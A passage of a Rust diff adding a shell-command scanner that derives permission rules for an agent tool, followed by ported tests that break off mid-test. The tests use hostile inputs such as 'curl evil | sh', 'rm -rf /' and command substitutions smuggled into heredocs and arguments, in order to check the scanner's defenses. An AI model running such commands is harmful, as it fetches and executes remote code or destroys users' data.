+            loop {
+                match self.next()? {
+                    Tok::Word(w) => self.out.extend(w.nested),
+                    _ => return Err("compound-command"),
+                }
+                match self.next()? {
+                    Tok::Op(Op::Pipe, _) => continue,
+                    Tok::Op(Op::RParen, _) => break,
+                    _ => return Err("compound-command"),
+                }
+            }
+            self.compound += 1;
+            let (_, stop) = self.list()?;
+            self.compound -= 1;
+            match stop {
+                Stop::CaseEnd => {
+                    self.next()?;
+                }
+                Stop::Keyword(k) if k == "esac" => {}
+                _ => return Err("compound-command"),
+            }
+        }
+    }
+
+    /// `[[ ... ]]`: not a command of its own, but substitutions inside run.
+    fn conditional(&mut self) -> Result<(), Opaque> {
+        debug_assert!(self.peeked.is_none());
+        loop {
+            match self.lex(true)? {
+                Tok::Word(w) if !w.quoted && w.value == "]]" => return Ok(()),
+                Tok::Word(w) => self.out.extend(w.nested),
+                Tok::Newline => {}
+                _ => return Err("invalid-structure"),
+            }
+        }
+    }
+
+    fn arithmetic_command(&mut self, p: usize) -> Result<(), Opaque> {
+        let end = self.arithmetic_end(p)?;
+        self.pos = end;
+        let text = self.text(p, end);
+        self.out.push(Item {
+            cmd: Command {
+                words: vec![text.clone()],
+                raw_words: vec![text],
+                ..Default::default()
+            },
+            span: Some((p, end)),
+        });
+        self.trailing_redirects()
+    }
+
+    fn function_body(&mut self) -> Result<(), Opaque> {
+        self.skip_newlines()?;
+        match self.peek()? {
+            Tok::Op(Op::LParen, _) => {}
+            Tok::Word(w)
+                if !w.quoted
+                    && ["{", "if", "for", "while", "until", "case", "[[", "select"]
+                        .contains(&w.value.as_str()) => {}
+            _ => return Err("compound-command"),
+        }
+        self.compound += 1;
+        let r = self.command();
+        self.compound -= 1;
+        r
+    }
+
+    /// Redirects after a compound command, kept as a resource of their own.
+    fn trailing_redirects(&mut self) -> Result<(), Opaque> {
+        let mut first: Option<(usize, usize)> = None;
+        let mut end = 0;
+        let mut nested = Vec::new();
+        let mut heredoc = false;
+        while let Tok::Redir(_) = self.peek()? {
+            let Tok::Redir(r) = self.next()? else {
+                unreachable!()
+            };
+            first.get_or_insert((r.start, r.op_end));
+            end = r.end;
+            heredoc |= r.heredoc;
+            nested.extend(r.nested);
+        }
+        if let Some((start, op_end)) = first {
+            self.push(
+                Command {
+                    redirect_prefix_end: Some(op_end - start),
+                    ..Default::default()
+                },
+                start,
+                end,
+                heredoc,
+            );
+        }
+        self.out.extend(nested);
+        Ok(())
+    }
+
+    fn push(&mut self, cmd: Command, start: usize, mut end: usize, heredoc: bool) {
+        // The body may already have been read, when the newline ending the
+        // command was looked at before the command was complete.
+        let read = heredoc && self.heredocs.is_empty() && self.heredoc_end.is_some();
+        if read {
+            end = self.heredoc_end.take().unwrap();
+        } else if heredoc {
+            self.heredoc_owners.push(self.out.len());
+        }
+        self.out.push(Item {
+            cmd,
+            span: Some((start, end)),
+        });
+        if read {
+            let nested = std::mem::take(&mut self.heredoc_nested);
+            self.out.extend(nested);
+        }
+    }
+
+    fn simple_command(&mut self) -> Result<(), Opaque> {
+        let mut start = None;
+        let mut end = 0;
+        let mut words: Vec<Word> = Vec::new();
+        let mut assignments = 0;
+        let mut redirects: Vec<(usize, usize)> = Vec::new(); // (words before it, op_end)
+        let mut nested = Vec::new();
+        let mut heredoc = false;
+        loop {
+            match self.peek()? {
+                Tok::Word(_) => {
+                    let Tok::Word(mut w) = self.next()? else {
+                        unreachable!()
+                    };
+                    start.get_or_insert(w.start);
+                    end = w.end;
+                    nested.append(&mut w.nested);
+                    if words.is_empty() && w.assignment {
+                        assignments += 1;
+                        continue;
+                    }
+                    if words.is_empty() && !w.quoted && redirects.is_empty() && assignments == 0 {
+                        // `name() body` defines a function; only the body runs.
+                        let mut i = self.pos;
+                        while matches!(self.at(i), Some(' ') | Some('\t')) {
+                            i += 1;
+                        }
+                        if self.peeked.is_none() && self.at(i) == Some('(') {
+                            let mut j = i + 1;
+                            while matches!(self.at(j), Some(' ') | Some('\t')) {
+                                j += 1;
+                            }
+                            if self.at(j) == Some(')') {
+                                self.pos = j + 1;
+                                self.out.extend(nested);
+                                return self.function_body();
+                            }
+                        }
+                    }
+                    words.push(w);
+                }
+                Tok::Redir(_) => {
+                    let Tok::Redir(r) = self.next()? else {
+                        unreachable!()
+                    };
+                    start.get_or_insert(r.start);
+                    end = r.end;
+                    heredoc |= r.heredoc;
+                    redirects.push((words.len(), r.op_end));
+                    nested.extend(r.nested);
+                }
+                _ => break,
+            }
+        }
+        let Some(start) = start else {
+            return Err("invalid-structure");
+        };
+        if words.is_empty() {
+            if let Some(&(_, op_end)) = redirects.first() {
+                self.push(
+                    Command {
+                        redirect_prefix_end: Some(op_end - start),
+                        ..Default::default()
+                    },
+                    start,
+                    end,
+                    heredoc,
+                );
+            }
+            self.out.extend(nested);
+            return Ok(());
+        }
+        let first = &words[0];
+        let declaration = assignments == 0
+            && redirects.is_empty()
+            && first.raw == first.value
+            && DECLARATIONS.contains(&first.value.as_str());
+        let redirect_word_count = redirects
+            .iter()
+            .find(|(before, _)| *before > 0 && *before < words.len())
+            .map(|(before, _)| *before);
+        let cmd = Command {
+            resource: String::new(),
+            words: words.iter().map(|w| w.value.clone()).collect(),
+            raw_words: words.iter().map(|w| w.raw.clone()).collect(),
+            declaration,
+            redirect_word_count,
+            redirect_prefix_end: None,
+        };
+        self.push(cmd, start, end, heredoc);
+        self.out.extend(nested);
+        Ok(())
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Permission resources (OpenCode's ShellParse)
+// ---------------------------------------------------------------------------
+
+/// What a command needs permission for.
+#[derive(Debug, Clone, PartialEq, Default)]
+pub struct Analysis {
+    /// `(resource, save)`: the command checked against `shell` rules, and the
+    /// rule "always allow" saves for it.
+    pub commands: Vec<(String, String)>,
+    /// `cd`/`pushd` targets as written (relative to the working directory),
+    /// with `~` expanded.
+    pub directories: Vec<String>,
+}
+
+/// Commands whose first words are a subcommand: `git status`, `npm run build`.
+const ARITY: &[(&str, usize)] = &[
+    ("cat", 1),
+    ("cd", 1),
+    ("chmod", 1),
+    ("chown", 1),
+    ("cp", 1),
+    ("echo", 1),
+    ("env", 1),
+    ("export", 1),
+    ("grep", 1),
+    ("kill", 1),
+    ("killall", 1),
+    ("ln", 1),
+    ("ls", 1),
+    ("mkdir", 1),
+    ("mv", 1),
+    ("ps", 1),
+    ("pwd", 1),
+    ("rm", 1),
+    ("rmdir", 1),
+    ("sleep", 1),
+    ("source", 1),
+    ("tail", 1),
+    ("touch", 1),
+    ("unset", 1),
+    ("which", 1),
+    ("aws", 3),
+    ("az", 3),
+    ("bazel", 2),
+    ("brew", 2),
+    ("bun", 2),
+    ("bun run", 3),
+    ("bun x", 3),
+    ("cargo", 2),
+    ("cargo add", 3),
+    ("cargo run", 3),
+    ("cdk", 2),
+    ("cf", 2),
+    ("cmake", 2),
+    ("composer", 2),
+    ("consul", 2),
+    ("consul kv", 3),
+    ("crictl", 2),
+    ("deno", 2),
+    ("deno task", 3),
+    ("doctl", 3),
+    ("docker", 2),
+    ("docker builder", 3),
+    ("docker compose", 3),
+    ("docker container", 3),
+    ("docker image", 3),
+    ("docker network", 3),
+    ("docker volume", 3),
+    ("eksctl", 2),
+    ("eksctl create", 3),
+    ("firebase", 2),
+    ("flyctl", 2),
+    ("gcloud", 3),
+    ("gh", 3),
+    ("git", 2),
+    ("git config", 3),
+    ("git remote", 3),
+    ("git stash", 3),
+    ("go", 2),
+    ("gradle", 2),
+    ("helm", 2),
+    ("heroku", 2),
+    ("hugo", 2),
+    ("ip", 2),
+    ("ip addr", 3),
+    ("ip link", 3),
+    ("ip netns", 3),
+    ("ip route", 3),
+    ("kind", 2),
+    ("kind create", 3),
+    ("kubectl", 2),
+    ("kubectl kustomize", 3),
+    ("kubectl rollout", 3),
+    ("kustomize", 2),
+    ("make", 2),
+    ("mc", 2),
+    ("mc admin", 3),
+    ("minikube", 2),
+    ("mongosh", 2),
+    ("mysql", 2),
+    ("mvn", 2),
+    ("ng", 2),
+    ("npm", 2),
+    ("npm exec", 3),
+    ("npm init", 3),
+    ("npm run", 3),
+    ("npm view", 3),
+    ("npx", 2),
+    ("nvm", 2),
+    ("nx", 2),
+    ("openssl", 2),
+    ("openssl req", 3),
+    ("openssl x509", 3),
+    ("pip", 2),
+    ("pipenv", 2),
+    ("pnpm", 2),
+    ("pnpm dlx", 3),
+    ("pnpm exec", 3),
+    ("pnpm run", 3),
+    ("poetry", 2),
+    ("podman", 2),
+    ("podman container", 3),
+    ("podman image", 3),
+    ("psql", 2),
+    ("pulumi", 2),
+    ("pulumi stack", 3),
+    ("python", 2),
+    ("pyenv", 2),
+    ("rake", 2),
+    ("rbenv", 2),
+    ("redis-cli", 2),
+    ("rustup", 2),
+    ("serverless", 2),
+    ("sfdx", 3),
+    ("skaffold", 2),
+    ("sls", 2),
+    ("sst", 2),
+    ("swift", 2),
+    ("systemctl", 2),
+    ("terraform", 2),
+    ("terraform workspace", 3),
+    ("tmux", 2),
+    ("turbo", 2),
+    ("ufw", 2),
+    ("vault", 2),
+    ("vault auth", 3),
+    ("vault kv", 3),
+    ("vercel", 2),
+    ("volta", 2),
+    ("wp", 2),
+    ("yarn", 2),
+    ("yarn dlx", 3),
+    ("yarn run", 3),
+];
+
+/// The leading words that name what a command does (`git status`, `npm run build`).
+pub fn prefix(tokens: &[String]) -> Vec<String> {
+    let tokens = &tokens[..tokens.len().min(3)];
+    for len in (1..=tokens.len()).rev() {
+        let key = tokens[..len].join(" ");
+        if let Some((_, arity)) = ARITY.iter().find(|(k, _)| *k == key) {
+            return tokens[..(*arity).min(tokens.len())].to_vec();
+        }
+    }
+    tokens.iter().take(1).cloned().collect()
+}
+
+const CWD: [&str; 4] = ["cd", "chdir", "popd", "pushd"];
+
+/// The permission resources of `command`, or why it cannot be analyzed.
+pub fn analyze(command: &str, cwd: &Path) -> Result<Analysis, String> {
+    let commands = scan(command)
+        .map_err(|reason| format!("Portable shell scanner cannot analyze command: {reason}"))?;
+    let mut out = Analysis::default();
+    for item in commands {
+        if item.declaration {
+            continue;
+        }
+        if let Some(end) = item.redirect_prefix_end {
+            let chars: Vec<char> = item.resource.chars().collect();
+            let head: String = chars[..end.min(chars.len())].iter().collect();
+            let sep = match chars.get(end) {
+                Some('\t') => '\t',
+                Some('\n') => '\n',
+                _ => ' ',
+            };
+            out.commands
+                .push((item.resource.clone(), format!("{head}{sep}*")));
+            continue;
+        }
+        let words: Vec<String> = match item.redirect_word_count {
+            Some(n) => item.raw_words[..n].to_vec(),
+            None => item.raw_words.clone(),
+        };
+        if let Some(index) = directory_command(&item.raw_words) {
+            let (dirs, complete) =
+                directory_args(&item.raw_words[index..], &item.words[index..], cwd);
+            out.directories.extend(dirs);
+            if index == 0 && complete {
+                continue;
+            }
+        }
+        let save = format!("{} *", prefix(&words).join(" "));
+        out.commands.push((item.resource, save));
+    }
+    Ok(out)
+}
+
+/// Where `cd`/`pushd`/... sits in `raw` (after `builtin`/`command` wrappers).
+fn directory_command(raw: &[String]) -> Option<usize> {
+    let head = raw.first()?;
+    if CWD.contains(&head.as_str()) {
+        return Some(0);
+    }
+    let mut i = 0;
+    while matches!(
+        raw.get(i).map(String::as_str),
+        Some("builtin") | Some("command")
+    ) {
+        let wrapper = raw[i].clone();
+        i += 1;
+        while let Some(flag) = raw.get(i).filter(|f| f.starts_with('-')) {
+            let flag = flag.clone();
+            i += 1;
+            if flag == "--" {
+                break;
+            }
+            if wrapper == "command" && regex_lite_cv(&flag) {
+                return None;
+            }
+        }
+    }
+    (i > 0 && raw.get(i).is_some_and(|w| CWD.contains(&w.as_str()))).then_some(i)
+}
+
+/// `command -v`/`-V` (possibly with `-p`) only looks a name up.
+fn regex_lite_cv(flag: &str) -> bool {
+    let rest = &flag[1..];
+    let trimmed = rest.trim_start_matches('p');
+    trimmed.starts_with('v') || trimmed.starts_with('V')
+}
+
+fn directory_args(raw: &[String], values: &[String], cwd: &Path) -> (Vec<String>, bool) {
+    if raw[0] == "popd" {
+        return (Vec::new(), false);
+    }
+    let mut end_of_options = false;
+    let mut operands = Vec::new();
+    for (r, v) in raw.iter().zip(values).skip(1) {
+        if end_of_options {
+            operands.push((r, v));
+            continue;
+        }
+        if v == "--" {
+            end_of_options = true;
+            continue;
+        }
+        if v == "-" || !v.starts_with('-') {
+            operands.push((r, v));
+        }
+    }
+    if operands.is_empty() {
+        return (Vec::new(), false);
+    }
+    let resolved: Vec<Option<String>> = operands
+        .iter()
+        .map(|(r, v)| {
+            if v.as_str() == "-" || !is_static_word(r) {
+                None
+            } else {
+                expand_known_directory(v, cwd, r.starts_with('~'))
+            }
+        })
+        .collect();
+    let complete = resolved.iter().all(Option::is_some);
+    (resolved.into_iter().flatten().collect(), complete)
+}
+
+fn home() -> PathBuf {
+    dirs::home_dir().unwrap_or_default()
+}
+
+fn expand_known_directory(value: &str, cwd: &Path, unquoted_tilde: bool) -> Option<String> {
+    if value == "~" {
+        return Some(home().display().to_string());
+    }
+    if let Some(rest) = value.strip_prefix("~/") {
+        return Some(home().join(rest).display().to_string());
+    }
+    if unquoted_tilde {
+        if value == "~+" {
+            return Some(cwd.display().to_string());
+        }
+        if let Some(rest) = value.strip_prefix("~+/") {
+            return Some(cwd.join(rest).display().to_string());
+        }
+        let body = &value[1..];
+        let name_end = body.find('/').unwrap_or(body.len());
+        let name = &body[..name_end];
+        if name.is_empty() {
+            return Some(value.to_string());
+        }
+        let dir_stack = name.starts_with(['+', '-'])
+            && name[1..].chars().all(|c| c.is_ascii_digit())
+            || name.chars().all(|c| c.is_ascii_digit());
+        if dir_stack {
+            return None;
+        }
+        let user = name.chars().next().is_some_and(is_name_start)
+            && name
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || "._-".contains(c));
+        if user {
+            let home = user_home(name)?;
+            let rest = body[name_end..].trim_start_matches('/');
+            return Some(if rest.is_empty() {
+                home.display().to_string()
+            } else {
+                home.join(rest).display().to_string()
+            });
+        }
+    }
+    Some(value.to_string())
+}
+
+fn user_home(user: &str) -> Option<PathBuf> {
+    if std::env::var("USER").ok().as_deref() == Some(user) {
+        return dirs::home_dir();
+    }
+    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
+        for line in passwd.lines() {
+            if line.starts_with('#') {
+                continue;
+            }
+            let fields: Vec<&str> = line.split(':').collect();
+            if fields.len() > 5 && fields[0] == user && !fields[5].is_empty() {
+                return Some(PathBuf::from(fields[5]));
+            }
+        }
+    }
+    if cfg!(target_os = "macos") {
+        let candidate = Path::new("/Users").join(user);
+        if candidate.is_dir() {
+            return Some(candidate);
+        }
+    }
+    None
+}
+
+/// Whether `raw` names one fixed path: no expansions, no brace expansion, and
+/// no unquoted glob in a path segment that starts with a dot (which could
+/// match `..`). Ported from OpenCode's `isStaticBashWord`.
+fn is_static_word(raw: &str) -> bool {
+    #[derive(Default)]
+    struct Segments {
+        started: bool,
+        dot: bool,
+        glob: bool,
+        ansi_escape: bool,
+        unquoted_glob: bool,
+    }
+    impl Segments {
+        fn record(&mut self, c: char, glob: bool) -> bool {
+            if glob {
+                self.unquoted_glob = true;
+            }
+            if self.ansi_escape && self.unquoted_glob {
+                return false;
+            }
+            if c == '/' {
+                self.started = false;
+                self.dot = false;
+                self.glob = false;
+                return true;
+            }
+            if !self.started {
+                self.started = true;
+                self.dot = c == '.';
+            }
+            if glob {
+                self.glob = true;
+            }
+            !(self.dot && self.glob)
+        }
+    }
+    #[derive(PartialEq)]
+    enum Q {
+        None,
+        Single,
+        Double,
+        Ansi,
+    }
+    let expands = |n: Option<&char>| {
+        n.is_some_and(|n| n.is_ascii_alphanumeric() || "_@*#?$!({[-".contains(*n))
+    };
+    let chars: Vec<char> = raw.chars().collect();
+    let mut seg = Segments::default();
+    let mut quote = Q::None;
+    let mut braces: Vec<bool> = Vec::new();
+    let mut i = 0;
+    while i < chars.len() {
+        let c = chars[i];
+        let next = chars.get(i + 1);
+        i += 1;
+        match quote {
+            Q::Single => {
+                if c == '\'' {
+                    quote = Q::None;
+                } else if !seg.record(c, false) {
+                    return false;
+                }
+                continue;
+            }
+            Q::Ansi => {
+                if c == '\\' {
+                    seg.ansi_escape = true;
+                    if seg.unquoted_glob {
+                        return false;
+                    }
+                    i += 1;
+                } else if c == '\'' {
+                    quote = Q::None;
+                } else if !seg.record(c, false) {
+                    return false;
+                }
+                continue;
+            }
+            Q::Double => {
+                if c == '\\' && next.is_some_and(|n| "$`\"\\\n".contains(*n)) {
+                    let n = *next.unwrap();
+                    i += 1;
+                    if n != '\n' && !seg.record(n, false) {
+                        return false;
+                    }
+                } else if c == '"' {
+                    quote = Q::None;
+                } else if c == '`' || (c == '$' && expands(next)) || !seg.record(c, false) {
+                    return false;
+                }
+                continue;
+            }
+            Q::None => {}
+        }
+        let ok = match c {
+            '\\' => {
+                i += 1;
+                next.is_none_or(|&n| n == '\n' || seg.record(n, false))
+            }
+            '\'' => {
+                quote = Q::Single;
+                true
+            }
+            '"' => {
+                quote = Q::Double;
+                true
+            }
+            '$' if next == Some(&'\'') => {
+                quote = Q::Ansi;
+                i += 1;
+                true
+            }
+            '$' if next == Some(&'"') => {
+                quote = Q::Double;
+                i += 1;
+                true
+            }
+            '`' => false,
+            '<' | '>' | '=' if next == Some(&'(') => false,
+            '$' if expands(next) => false,
+            '{' => {
+                braces.push(false);
+                seg.record(c, false)
+            }
+            '}' if !braces.is_empty() => braces.pop() != Some(true) && seg.record(c, false),
+            c => {
+                if !braces.is_empty() && (c == ',' || (c == '.' && next == Some(&'.'))) {
+                    *braces.last_mut().unwrap() = true;
+                }
+                seg.record(c, matches!(c, '*' | '?' | '['))
+            }
+        };
+        if !ok {
+            return false;
+        }
+    }
+    quote == Q::None
+}
+
+#[cfg(test)]
+mod tests {
+    // ---------------------------------------------------------------------
+    // Ported from OpenCode's packages/core/test/shell-scan/scan.test.ts,
+    // shell-scan/adversarial.test.ts, shell-scan/redirect.test.ts and
+    // shell-parse.test.ts (MIT). `oc_scan_*` cover the scanner,
+    // `oc_shell_parse_*` the permission resources derived from it.
+    //
+    // Intentional differences:
+    // - PowerShell cases are not ported: CodeSmith runs `<shell> -c` only.
+    // - OpenCode's scanner is a full Bash/Zsh lexer (2,600 lines); this one
+    //   covers the common grammar. Exotic forms it does not know are opaque
+    //   (refused), never let through: see the module header. The
+    //   bounded-time corpus, generated oracle and Zsh-flag suites are not
+    //   ported; the bounded-time inputs are checked to finish quickly.
+    // - Opaque results carry a reason, but only the reasons asserted by the
+    //   OpenCode cases ported here are pinned.
+    // ---------------------------------------------------------------------
+    use super::*;
+
+    fn cmds(src: &str) -> Vec<Command> {
+        scan(src).unwrap_or_else(|r| panic!("{src:?} is opaque: {r}"))
+    }
+
+    fn heads(src: &str) -> Vec<String> {
+        cmds(src).into_iter().map(|c| c.words[0].clone()).collect()
+    }
+
+    fn resources(src: &str) -> Vec<String> {
+        cmds(src).into_iter().map(|c| c.resource).collect()
+    }
+
+    fn cmd(resource: &str, words: &[&str], raw: &[&str]) -> Command {
+        Command {
+            resource: resource.into(),
+            words: words.iter().map(|s| s.to_string()).collect(),
+            raw_words: raw.iter().map(|s| s.to_string()).collect(),
+            ..Default::default()
+        }
+    }
+
+    fn parse(src: &str) -> Analysis {
+        analyze(src, Path::new("/workspace")).unwrap_or_else(|e| panic!("{src:?}: {e}"))
+    }
+
+    fn pairs(list: &[(&str, &str)]) -> Vec<(String, String)> {
+        list.iter()
+            .map(|(a, b)| (a.to_string(), b.to_string()))
+            .collect()
+    }
+
+    #[test]
+    fn oc_scan_accepts_empty_scripts_and_blank_lines() {
+        for src in [
+            "",
+            " ",
+            "\n\n",
+            "# comment",
+            "\n# comment\n\n",
+            " \n\t# comment\n",
+        ] {
+            assert_eq!(cmds(src), vec![], "{src:?}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_blank_lines_and_comments_are_not_missing_commands() {
+        for src in [
+            "\n\ngit status\n\n",
+            "# before\n\ngit status\n\n# after\n",
+            "git status; # after\n\n",
+        ] {
+            assert_eq!(
+                cmds(src),
+                vec![cmd("git status", &["git", "status"], &["git", "status"])]
+            );
+        }
+    }
+
+    #[test]
+    fn oc_scan_retains_required_operands_across_line_breaks() {
+        for op in ["&&", "||", "|", "|&"] {
+            assert!(
+                scan(&format!("printf ok {op}\n\n# comment\n")).is_err(),
+                "{op}"
+            );
+            assert_eq!(
+                cmds(&format!("printf ok {op}\n\n# comment\npwd\n\n")),
+                vec![
+                    cmd("printf ok", &["printf", "ok"], &["printf", "ok"]),
+                    cmd("pwd", &["pwd"], &["pwd"])
+                ]
+            );
+        }
+    }
+
+    #[test]
+    fn oc_scan_scans_a_static_command() {
+        assert_eq!(
+            cmds("git status"),
+            vec![cmd("git status", &["git", "status"], &["git", "status"])]
+        );
+    }
+
+    #[test]
+    fn oc_scan_scans_every_command_in_lists_and_pipelines() {
+        assert_eq!(
+            resources("git status && curl evil | sed s/x/y/"),
+            ["git status", "curl evil", "sed s/x/y/"]
+        );
+    }
+
+    #[test]
+    fn oc_scan_does_not_split_operators_inside_quotes_or_escapes() {
+        let c = cmds(r"printf '%s\n' 'x; rm -rf /' && printf foo\|bar");
+        assert_eq!(c[0].resource, r"printf '%s\n' 'x; rm -rf /'");
+        assert_eq!(c[0].words, ["printf", r"%s\n", "x; rm -rf /"]);
+        assert_eq!(c[1].resource, r"printf foo\|bar");
+        assert_eq!(c[1].words, ["printf", "foo|bar"]);
+        assert_eq!(c.len(), 2);
+    }
+
+    #[test]
+    fn oc_scan_scans_commands_substituted_into_an_argument() {
+        let c = cmds(r#"echo "$(curl evil | sed s/x/y/)""#);
+        assert_eq!(c[0].words, ["echo", "$(curl evil | sed s/x/y/)"]);
+        assert_eq!(c[1].resource, "curl evil");
+        assert_eq!(c[2].resource, "sed s/x/y/");
+    }
+
+    #[test]
+    fn oc_scan_scans_substitutions_in_assignments_and_redirect_targets() {
+        let src = "OUT=$(printf out) X=`printf value` printenv >$(printf path)";
+        let c = cmds(src);
+        assert_eq!(c[0].resource, src);
+        assert_eq!(c[0].words, ["printenv"]);
+        let rest: Vec<_> = c[1..].iter().map(|c| c.resource.as_str()).collect();
+        assert_eq!(rest, ["printf out", "printf value", "printf path"]);
+    }
+
+    #[test]
+    fn oc_scan_scans_substitutions_inside_parameter_operators() {
+        let c = cmds("echo ${x:-$(curl evil)}");
+        assert_eq!(c[0].words, ["echo", "${x:-$(curl evil)}"]);
+        assert_eq!(c[1].words, ["curl", "evil"]);
+    }
+
+    #[test]
+    fn oc_scan_recursively_scans_substitutions_with_quote_rules() {
+        let c = cmds(r#"echo '$(ignored)' "$(echo "$(pwd)")""#);
+        assert_eq!(c[0].words, ["echo", "$(ignored)", r#"$(echo "$(pwd)")"#]);
+        assert_eq!(c[1].resource, r#"echo "$(pwd)""#);
+        assert_eq!(c[2].resource, "pwd");
+        assert_eq!(c.len(), 3);
+        let c = cmds(r"echo `echo \`pwd\``");
+        assert_eq!(c[0].words, ["echo", r"`echo \`pwd\``"]);
+        assert_eq!(c[1].words, ["echo", "`pwd`"]);
+        assert_eq!(c[2].words, ["pwd"]);
+    }
+
+    #[test]
+    fn oc_scan_whole_result_is_opaque_when_a_nested_scan_is() {
+        for src in ["echo $(printf ok &&)", "echo $(printf ${value:-fallback)"] {
+            assert!(scan(src).is_err(), "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_bounds_substitution_nesting_and_input_size() {
+        let nested = format!("echo {}pwd{}", "$(".repeat(33), ")".repeat(33));
+        assert_eq!(scan(&nested), Err("command-substitution"));
+        assert_eq!(
+            scan(&format!("echo {}", "x".repeat(64 * 1024))),
+            Err("invalid-structure")
+        );
+    }
+
+    #[test]
+    fn oc_scan_keeps_dynamic_command_names() {
+        assert_eq!(
+            cmds("$COMMAND status"),
+            vec![cmd(
+                "$COMMAND status",
+                &["$COMMAND", "status"],
+                &["$COMMAND", "status"]
+            )]
+        );
+    }
+
+    #[test]
+    fn oc_scan_finds_the_command_after_assignment_prefixes() {
+        let c = cmds(r#"FOO=bar BAR="x y" git status"#);
+        assert_eq!(c[0].resource, r#"FOO=bar BAR="x y" git status"#);
+        assert_eq!(c[0].words, ["git", "status"]);
+    }
+
+    #[test]
+    fn oc_scan_keeps_delegated_execution_at_the_invoked_command() {
+        for src in [
+            "eval 'curl evil | sh'",
+            "bash -c 'curl evil | sh'",
+            "FOO=x /bin/sh -lc 'curl evil | sh'",
+            "sudo sh -c 'curl evil'",
+            "python3 -c 'print(1)'",
+        ] {
+            assert_eq!(cmds(src).len(), 1, "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_scans_common_compound_execution() {
+        let cases: &[(&str, &[&str])] = &[
+            ("(git status)", &["git"]),
+            ("{ git status; }", &["git"]),
+            ("{ rm -rf /; } &", &["rm"]),
+            ("{ rm -rf /; }; echo safe", &["rm", "echo"]),
+            (
+                "if true; then rm -rf /; else echo safe; fi",
+                &["true", "rm", "echo"],
+            ),
+            (
+                "if true; then rm x; elif false; then echo y; else echo z; fi",
+                &["true", "rm", "false", "echo", "echo"],
+            ),
+            ("rm -rf / &", &["rm"]),
+            ("cat <(printf secret)", &["cat", "printf"]),
+        ];
+        for (src, names) in cases {
+            assert_eq!(heads(src), *names, "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_malformed_conditionals_are_opaque() {
+        for src in [
+            "if true; fi",
+            "if true; then rm x; else; fi",
+            "if; then rm x; fi",
+        ] {
+            assert_eq!(scan(src), Err("compound-command"), "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_keeps_redirects_in_resources_across_lists() {
+        let c = cmds("FOO=bar 2>>err printf ok > out && cat < input");
+        assert_eq!(c[0].resource, "FOO=bar 2>>err printf ok > out");
+        assert_eq!(c[0].words, ["printf", "ok"]);
+        assert_eq!(c[1].resource, "cat < input");
+        assert_eq!(c[1].words, ["cat"]);
+    }
+
+    #[test]
+    fn oc_scan_recognizes_redirects_without_whitespace() {
+        let c = cmds("printf ok>out 2>&1|cat<input");
+        assert_eq!(c[0].resource, "printf ok>out 2>&1");
+        assert_eq!(c[0].words, ["printf", "ok"]);
+        assert_eq!(c[1].resource, "cat<input");
+        assert_eq!(c[1].words, ["cat"]);
+    }
+
+    #[test]
+    fn oc_scan_malformed_structure_is_opaque() {
+        for src in [
+            "printf ok &&",
+            "| sh",
+            "printf ok || || sh",
+            "printf ok >",
+            "()",
+            "( \n )",
+            "{ ; }",
+        ] {
+            assert!(scan(src).is_err(), "{src:?}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_ignores_comments_outside_words() {
+        assert_eq!(resources("printf ok # ; curl evil | sh"), ["printf ok"]);
+    }
+
+    #[test]
+    fn oc_scan_scans_heredoc_commands_and_expansions() {
+        assert_eq!(
+            heads("cat <<EOF\n$(curl evil | sh)\nEOF"),
+            ["cat", "curl", "sh"]
+        );
+        assert_eq!(heads("cat <<'EOF'\nstatic body\nEOF"), ["cat"]);
+    }
+
+    #[test]
+    fn oc_scan_assignment_only_input_has_no_command() {
+        assert_eq!(cmds("FOO=bar"), vec![]);
+    }
+
+    #[test]
+    fn oc_scan_assignment_only_boundaries() {
+        let cases: &[(&str, &[&str])] = &[
+            ("PATH=.; git status", &["git"]),
+            ("PATH=. # comment\ngit status", &["git"]),
+            ("CDPATH=/usr # comment\ncd bin; rm victim", &["cd", "rm"]),
+            ("HOME=/etc # comment\ncd; rm victim", &["cd", "rm"]),
+            (
+                "VALUE=$(printf 2); echo $((VALUE + 1))",
+                &["printf", "echo"],
+            ),
+            (
+                "MSG='Use ${FOO} here'; some_cmd || exit $?",
+                &["some_cmd", "exit"],
+            ),
+            (
+                "f() { local REGEX='[0-9]+${FOO}'; return $?; }",
+                &["local", "return"],
+            ),
+        ];
+        for (src, names) in cases {
+            assert_eq!(heads(src), *names, "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_parameter_operator_grammar() {
+        for src in [
+            "echo ${url:-http://example.test}",
+            r#"printf '%s' "${PATH//:/$'\n'}""#,
+        ] {
+            assert!(scan(src).is_ok(), "{src}");
+        }
+    }
+
+    #[test]
+    fn oc_scan_bash_lexical_forms() {
+        for src in [
+            ":; { touch /tmp/victim; }",
+            "{fd}>/tmp/log touch /tmp/victim",
+            "time touch /tmp/victim",
+            r#"printf '%s' "$(printf safe ${x%)}; touch /tmp/victim)""#,
+            "if true; then echo safe; fi > /tmp/victim",
+            "if true; then :; 'if' victim; fi",
+        ] {
+            assert!(scan(src).is_ok(), "{src}");
+        }
+        assert!(
+            heads(r#"printf '%s' "$(printf safe ${x%)}; touch /tmp/victim)""#)
+                .contains(&"touch".to_string())
+        );
+        assert_eq!(
+            heads("if true; then :; 'if' victim; fi"),
+            ["true", ":", "if"]
+        );
+    }
+
+    #[test]
+    fn oc_scan_bounds_nested_parameter_expansions() {
+        let src = format!("printf '%s' \"{}x{}\"", "${".repeat(1000), "}".repeat(1000));
+        assert!(scan(&src).is_err());
+    }
+
+    #[test]
+    fn oc_scan_lexical_provenance_quotes_assignments_and_redirects() {
+        let src = r#"FOO='x y' 2>"error log" g"it" 'status' a\ b "" >output"#;
+        assert_eq!(
+            cmds(src),
+            vec![cmd(
+                src,
+                &["git", "status", "a b", ""],
+                &[r#"g"it""#, "'status'", r"a\ b", r#""""#]
+            )]
+        );
+    }
+
+    #[test]
+    fn oc_scan_quoted_assignment_like_words_and_fd_numbers_are_words() {
+        let src = r#"F"OO"=bar '123'>out"#;
+        assert_eq!(
+            cmds(src),
+            vec![cmd(src, &["FOO=bar", "123"], &[r#"F"OO"=bar"#, "'123'"])]
+        );
+    }
+
+    #[test]
+    fn oc_scan_retains_nested_substitutions_and_continuations() {
